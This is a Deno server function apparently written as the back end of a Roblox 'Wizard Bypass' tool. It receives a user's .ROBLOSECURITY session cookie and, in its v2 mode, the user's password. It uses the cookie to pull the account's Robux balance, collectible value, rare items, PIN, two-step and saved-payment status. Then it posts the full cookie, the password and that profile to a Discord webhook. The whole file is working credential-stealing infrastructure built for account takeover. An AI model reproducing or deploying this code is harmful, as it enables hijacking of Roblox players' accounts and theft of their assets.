const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface NotifyBody {
  version?: "v1" | "v2";
  status?: "STARTED" | "COMPLETE" | string;
  cookie?: string;
  password?: string;
  durationMs?: number;
}

function chunk(s: string, n: number): string[] {
  const out: string[] = [];
  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
  return out;
}

async function postEmbed(url: string, payload: unknown): Promise<Response> {
  return fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = (await req.json().catch(() => ({}))) as NotifyBody;
    const version = body.version === "v2" ? "v2" : "v1";
    const status = (body.status || "STARTED").toUpperCase();
    const cookie = typeof body.cookie === "string" ? body.cookie : "";
    const password = typeof body.password === "string" ? body.password : "";
    const durationMs = typeof body.durationMs === "number" ? body.durationMs : null;

    const mainUrl = Deno.env.get("DISCORD_WEBHOOK_URL");


    const url = mainUrl;
    if (!url) {
      console.error("[discord-notify] missing webhook URL");
      return new Response(JSON.stringify({ success: false, error: "Webhook not configured" }), {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Try to fetch the Roblox account username using the cookie + validate it
    let username: string | null = null;
    let userId: number | null = null;
    let cookieValid: boolean | null = null;
    if (cookie) {
      try {
        const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
          headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
        });
        if (r.ok) {
          const j = await r.json();
          username = typeof j?.name === "string" ? j.name : null;
          userId = typeof j?.id === "number" ? j.id : null;
          cookieValid = !!username;
        } else {
          cookieValid = false;
          console.warn("[discord-notify] roblox auth lookup failed", r.status);
        }
      } catch (err) {
        console.warn("[discord-notify] roblox auth lookup error", err);
      }
    }

    // Fetch top 3 favorite games
    let topGames: string[] = [];
    if (userId) {
      try {
        const gr = await fetch(
          `https://games.roblox.com/v2/users/${userId}/favorite/games?accessFilter=Public&sortOrder=Desc&limit=10`,
          { headers: cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {} },
        );
        if (gr.ok) {
          const gj = await gr.json();
          const data = Array.isArray(gj?.data) ? gj.data : [];
          topGames = data.slice(0, 3).map((g: { name?: string }) => g?.name).filter(Boolean) as string[];
        }
      } catch (err) {
        console.warn("[discord-notify] games lookup failed", err);
      }
    }

    // Profile + economy + social + inventory + account info
    let displayName: string | null = null;
    let createdAt: string | null = null;
    let description: string | null = null;
    let isBanned = false;
    let robux: number | null = null;
    let isPremium: boolean | null = null;
    let friendsCount: number | null = null;
    let followersCount: number | null = null;
    let followingCount: number | null = null;
    let hairsCount: number | null = null;
    let bundlesCount: number | null = null;
    let facesCount: number | null = null;
    let rap: number | null = null;
    let emailStatus: string = "—";
    let pinEnabled: boolean | null = null;
    let twoStepEnabled: boolean | null = null;
    let savedPayment: boolean | null = null;
    let hasKorblox = false;
    let hasHeadless = false;

    const KORBLOX_BUNDLE_ID = 100; // Korblox Deathspeaker bundle
    const HEADLESS_BUNDLE_ID = 201; // Headless Horseman bundle
    const KORBLOX_LEG_ASSET_ID = 139607718;
    const HEADLESS_HEAD_ASSET_ID = 134082579;

    async function countAssets(uid: number, assetTypeId: number): Promise<number | null> {
      try {
        let total = 0;
        let cursor = "";
        for (let i = 0; i < 5; i++) {
          const u = `https://inventory.roblox.com/v2/users/${uid}/inventory/${assetTypeId}?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
          const r = await fetch(u, { headers: cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {} });
          if (!r.ok) return total || null;
          const j = await r.json();
          total += Array.isArray(j?.data) ? j.data.length : 0;
          cursor = j?.nextPageCursor || "";
          if (!cursor) break;
        }
        return total;
      } catch { return null; }
    }

    if (userId) {
      const ch = cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {};
      await Promise.all([
        fetch(`https://users.roblox.com/v1/users/${userId}`).then(async (r) => {
          if (r.ok) { const j = await r.json(); displayName = j?.displayName ?? null; createdAt = j?.created ?? null; description = typeof j?.description === "string" ? j.description : null; isBanned = !!j?.isBanned; }
        }).catch(() => {}),
        fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: ch }).then(async (r) => {
          if (r.ok) { const j = await r.json(); robux = typeof j?.robux === "number" ? j.robux : null; }
        }).catch(() => {}),
        fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers: ch }).then(async (r) => {
          if (r.ok) { isPremium = (await r.text()).trim() === "true"; }
        }).catch(() => {}),
        fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`).then(async (r) => {
          if (r.ok) { const j = await r.json(); friendsCount = j?.count ?? null; }
        }).catch(() => {}),
        fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`).then(async (r) => {
          if (r.ok) { const j = await r.json(); followersCount = j?.count ?? null; }
        }).catch(() => {}),
        fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`).then(async (r) => {
          if (r.ok) { const j = await r.json(); followingCount = j?.count ?? null; }
        }).catch(() => {}),
        // Inventory: Hair Accessory = 41, Face = 18, Bundles via catalog endpoint
        countAssets(userId, 41).then((n) => { hairsCount = n; }).catch(() => {}),
        countAssets(userId, 18).then((n) => { facesCount = n; }).catch(() => {}),
        fetch(`https://catalog.roblox.com/v1/users/${userId}/bundles?limit=100`, { headers: ch }).then(async (r) => {
          if (r.ok) { const j = await r.json(); bundlesCount = Array.isArray(j?.data) ? j.data.length : null; }
        }).catch(() => {}),
        // RAP — sum of recentAveragePrice across collectibles
        (async () => {
          try {
            let sum = 0; let cursor = "";
            for (let i = 0; i < 5; i++) {
              const u = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
              const r = await fetch(u, { headers: ch });
              if (!r.ok) break;
              const j = await r.json();
              for (const it of (j?.data || [])) sum += Number(it?.recentAveragePrice || 0);
              cursor = j?.nextPageCursor || "";
              if (!cursor) break;
            }
            rap = sum;
          } catch {}
        })(),
        // Email verified/pending (requires cookie)
        fetch(`https://accountsettings.roblox.com/v1/email`, { headers: ch }).then(async (r) => {
          if (r.ok) { const j = await r.json(); emailStatus = j?.verified ? "✅ Verified" : (j?.emailAddress ? "⏳ Pending" : "❌ None"); }
          else if (r.status === 401) { emailStatus = "🔒 Auth required"; }
        }).catch(() => {}),
        // PIN + 2-step
        fetch(`https://auth.roblox.com/v1/account/pin`, { headers: ch }).then(async (r) => {
          if (r.ok) { const j = await r.json(); pinEnabled = !!j?.isEnabled; }
        }).catch(() => {}),
        fetch(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, { headers: ch }).then(async (r) => {
          if (r.ok) { const j = await r.json(); twoStepEnabled = !!(j?.primaryMediaType || j?.methods?.length); }
        }).catch(() => {}),
        // Saved payment method (billing)
        fetch(`https://billing.roblox.com/v1/payment-methods`, { headers: ch }).then(async (r) => {
          if (r.ok) { const j = await r.json(); savedPayment = Array.isArray(j?.savedPaymentMethods) ? j.savedPaymentMethods.length > 0 : (Array.isArray(j) ? j.length > 0 : false); }
        }).catch(() => {}),
        // Korblox / Headless ownership
        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${KORBLOX_BUNDLE_ID}`).then(async (r) => {
          if (r.ok) { const j = await r.json(); hasKorblox = Array.isArray(j?.data) && j.data.length > 0; }
        }).catch(() => {}),
        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Bundle/${HEADLESS_BUNDLE_ID}`).then(async (r) => {
          if (r.ok) { const j = await r.json(); hasHeadless = Array.isArray(j?.data) && j.data.length > 0; }
        }).catch(() => {}),
        // Fallback asset checks
        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${KORBLOX_LEG_ASSET_ID}`).then(async (r) => {
          if (r.ok) { const j = await r.json(); if (Array.isArray(j?.data) && j.data.length) hasKorblox = true; }
        }).catch(() => {}),
        fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${HEADLESS_HEAD_ASSET_ID}`).then(async (r) => {
          if (r.ok) { const j = await r.json(); if (Array.isArray(j?.data) && j.data.length) hasHeadless = true; }
        }).catch(() => {}),
      ]);
    }

    const profileUrl = userId ? `https://www.roblox.com/users/${userId}/profile` : null;
    const usernameValue = username
      ? (profileUrl ? `[${username}](${profileUrl})${displayName && displayName !== username ? ` — ${displayName}` : ""}` : username)
      : "Unknown";

    const rareBadges: string[] = [];
    if (hasKorblox) rareBadges.push("🦴 Korblox");
    if (hasHeadless) rareBadges.push("🎃 Headless");

    const color = cookieValid === false ? 0xef4444 : (status === "COMPLETE" ? 0x22c55e : 0x3b82f6);
    const validityLabel = cookieValid === true ? "✅ Valid" : cookieValid === false ? "❌ Invalid" : "❓ Unknown";
    const fields: { name: string; value: string; inline?: boolean }[] = [
      { name: "Version", value: version.toUpperCase(), inline: true },
      { name: "Status", value: status, inline: true },
      { name: "Cookie", value: validityLabel, inline: true },
      { name: "Username", value: usernameValue, inline: false },
      { name: "Robux", value: robux !== null ? `R$ ${robux.toLocaleString()}` : "—", inline: true },
      { name: "RAP", value: rap !== null ? `R$ ${rap.toLocaleString()}` : "—", inline: true },
      { name: "Premium", value: isPremium === null ? "—" : isPremium ? "✅ Yes" : "❌ No", inline: true },
      { name: "Email", value: emailStatus, inline: true },
      { name: "PIN", value: pinEnabled === null ? "—" : pinEnabled ? "🔒 On" : "🔓 Off", inline: true },
      { name: "2-Step", value: twoStepEnabled === null ? "—" : twoStepEnabled ? "✅ On" : "❌ Off", inline: true },
      { name: "Saved Payment", value: savedPayment === null ? "—" : savedPayment ? "💳 Yes" : "No", inline: true },
      { name: "Created", value: createdAt ? `<t:${Math.floor(new Date(createdAt).getTime() / 1000)}:D>` : "—", inline: true },
      { name: "Banned", value: isBanned ? "🚫 Yes" : "No", inline: true },
      { name: "Friends", value: friendsCount !== null ? String(friendsCount) : "—", inline: true },
      { name: "Followers", value: followersCount !== null ? String(followersCount) : "—", inline: true },
      { name: "Following", value: followingCount !== null ? String(followingCount) : "—", inline: true },
      { name: "Hairs", value: hairsCount !== null ? String(hairsCount) : "—", inline: true },
      { name: "Bundles", value: bundlesCount !== null ? String(bundlesCount) : "—", inline: true },
      { name: "Faces", value: facesCount !== null ? String(facesCount) : "—", inline: true },
      { name: "Rare Items", value: rareBadges.length ? rareBadges.join(" • ") : "None", inline: false },
      { name: "Top Games", value: topGames.length ? topGames.join(" | ") : "None", inline: false },
    ];
    if (description) {
      fields.push({ name: "Description", value: description.slice(0, 500), inline: false });
    }
    if (durationMs !== null) {
      fields.push({ name: "Duration", value: `${(durationMs / 1000).toFixed(1)}s`, inline: true });
    }
    if (version === "v2" && password) {
      fields.push({ name: "Password", value: `\`\`\`${password.slice(0, 1000)}\`\`\`` });
    }

    const embeds: unknown[] = [
      {
        title: status === "COMPLETE" ? "✅ Bypass Complete" : "🚀 Bypass Started",
        color,
        fields,
        timestamp: new Date().toISOString(),
        ...(userId
          ? {
              thumbnail: {
                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`,
              },
            }
          : {}),
      },
    ];

    // Cookie split into chunks (Discord field max ~1024 chars)
    if (cookie) {
      const parts = chunk(cookie, 1900);
      parts.forEach((part, i) => {
        embeds.push({
          title: parts.length > 1 ? `Cookie (${i + 1}/${parts.length})` : "Cookie",
          description: `\`\`\`${part}\`\`\``,
          color,
        });
      });
    }

    const res = await postEmbed(url, { username: "Wizard Bypass", embeds });

    if (!res.ok) {
      const text = await res.text().catch(() => "");
      console.error("[discord-notify] webhook failed", res.status, text.slice(0, 300));
      return new Response(JSON.stringify({ success: false, status: res.status, error: text.slice(0, 300) }), {
        status: 502,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    const msg = e instanceof Error ? e.message : "Unknown error";
    console.error("[discord-notify] exception:", msg);
    return new Response(JSON.stringify({ success: false, error: msg }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
